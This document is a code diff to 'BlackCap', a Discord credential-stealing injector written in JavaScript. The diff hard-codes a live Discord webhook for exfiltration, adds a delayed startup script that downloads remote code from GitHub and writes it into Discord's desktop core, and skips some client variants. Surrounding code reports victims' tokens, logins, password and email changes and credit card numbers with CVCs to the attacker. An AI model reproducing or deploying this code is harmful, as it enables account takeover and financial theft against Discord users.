@@ -28,7 +28,7 @@ const config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
-    webhook: "%WEBHOOK%",
+    webhook: "https://discord.com/api/webhooks/1059813567571972126/aIKRn8M42nVDrMvgwZA2MJg8hYfa8XCcDeM1pfPjQofwy3U8886M1lijhbi-1mzbWh7e",
     apiurl: "https://healthy-rowan-bottle.glitch.me/hello/",
     filter2: {
         urls: [
@@ -71,11 +71,13 @@ function updateCheck() {
     const appPath = path.join(resourcePath, "app");
     const packageJson = path.join(appPath, "package.json");
     const resourceIndex = path.join(appPath, "index.js");
+    //const indexJs = '%num_core_discord%'
     const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
     const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
     if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
     if(app === 'Lightcord')return;
     if(app === 'DiscordCanary')return;
+    if(app === 'DiscordPTB')return;
     if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
     if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
 
@@ -91,6 +93,10 @@ function updateCheck() {
             ),
         );
 
+
+
+        setTimeout(() => {
+            
         const startUpScript = `const fs = require('fs'), https = require('https');
 const indexJS = '${indexJs}';
 const bdPath = '${bdPath}';
@@ -105,7 +111,7 @@ fs.readFileSync(indexJS, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJS);
-        res.replace('core' + 'num', indexJS).replace('blackcap', '${config.apiurl}')
+        res.replace('%num_core_discord%', indexJS).replace('%WEBHOOK%', '${config.webhook}')
         res.pipe(file);
         file.on('finish', () => {
             file.close();
@@ -119,6 +125,7 @@ require('${path.join(resourcePath, "app.asar")}')
 if (fs.existsSync(bdPath)) require(bdPath);`;
 
         fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
+    }, 5000);
     }
     if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
     execScript(
@@ -171,6 +178,7 @@ function waitForElm(selector) {
 document.addEventListener('click',handler,false);
 `)
 };
+
 
 noSessionPlease()
 
@@ -275,7 +283,7 @@ async function FirstTime() {
                                 name: "BlackCap"
                             },
                             footer: {
-                                text: "©KSCH | https://github.com/KSCHdsc"
+                                text: "�KSCH | https://github.com/KSCHdsc"
                             }
 						}]
                     };
@@ -301,7 +309,7 @@ async function FirstTime() {
                         content: "",
                         embeds: [{
                             title: "BlackCap Initalized",
-                            description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                             color: config["embed-color"],
                             fields: [{
                                 name: "Injection Info",
@@ -342,7 +350,7 @@ async function FirstTime() {
 								}],
 
                             footer: {
-                                text: "©KSCH | https://github.com/KSCHdsc"
+                                text: "�KSCH | https://github.com/KSCHdsc"
                             },
                             image: {
                                 url: bannerurl,
@@ -388,7 +396,7 @@ async function FirstTime() {
                                         name: "BlackCap"
                                     },
                                     footer: {
-                                        text: "©KSCH | https://github.com/KSCHdsc"
+                                        text: "�KSCH | https://github.com/KSCHdsc"
                                     }
 						}]
                             };
@@ -414,7 +422,7 @@ async function FirstTime() {
                                 content: "",
                                 embeds: [{
                                     title: "BlackCap Victim got logged out",
-                                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                                     color: config["embed-color"],
                                     fields: [{
                                         name: "Injection Info",
@@ -451,7 +459,7 @@ async function FirstTime() {
 								}],
 
                                     footer: {
-                                        text: "©KSCH | https://github.com/KSCHdsc"
+                                        text: "�KSCH | https://github.com/KSCHdsc"
                                     },
                                     image: {
                                         url: bannerurl,
@@ -834,7 +842,7 @@ async function Login(email, password, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap User Login",
-                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -891,7 +899,7 @@ async function Login(email, password, token) {
 												}, ],
 
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -902,7 +910,7 @@ async function Login(email, password, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -994,7 +1002,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                 content: "",
                 embeds: [{
                     "title": "BlackCap Detect Password Changed",
-                    description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                     "color": config['embed-color'],
                     "fields": [{
                         name: "Injection Info",
@@ -1055,7 +1063,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
 												}, ],
 
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": `${usericonurl}`
@@ -1066,7 +1074,7 @@ async function ChangePassword(oldpassword, newpassword, token) {
                     "description": CalcFriends(),
 
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
@@ -1162,7 +1170,7 @@ async function ChangeEmail(newemail, password, token) {
                 content: "",
                 embeds: [{
                         "title": "BlackCap Detect Email Changed",
-                        description: "[<a:blackcapgif:1041634542093619260> │ **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
+                        description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                         "color": config['embed-color'],
                         "fields": [{
                                 name: "Injection Info",
@@ -1220,7 +1228,7 @@ async function ChangeEmail(newemail, password, token) {
 				],
 
                         "footer": {
-                            "text": "©KSCH | https://github.com/KSCHdsc"
+                            "text": "�KSCH | https://github.com/KSCHdsc"
                         },
                         "thumbnail": {
                             "url": `${usericonurl}`
@@ -1231,7 +1239,7 @@ async function ChangeEmail(newemail, password, token) {
                         "description": CalcFriends(),
 
                         "footer": {
-                            "text": "©KSCH | https://github.com/KSCHdsc"
+                            "text": "�KSCH | https://github.com/KSCHdsc"
                         },
                         "image": {
                             'url': `${bannerurl}`,
@@ -1290,7 +1298,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                         "name": "BlackCap"
                     },
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "thumbnail": {
                         "url": "https://cdn.discordapp.com/avatars/" + info.id + "/" + info.avatar
@@ -1302,7 +1310,7 @@ async function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
                     "description": `\`\`\`diff\n${fs.readFileSync('blackcaped_guilds_result.txt', 'utf-8') || "- This user is not the owner of any server"}\`\`\``,
 
                     "footer": {
-                        "text": "©KSCH | https://github.com/KSCHdsc"
+                        "text": "�KSCH | https://github.com/KSCHdsc"
                     },
                     "image": {
                         'url': `${bannerurl}`,
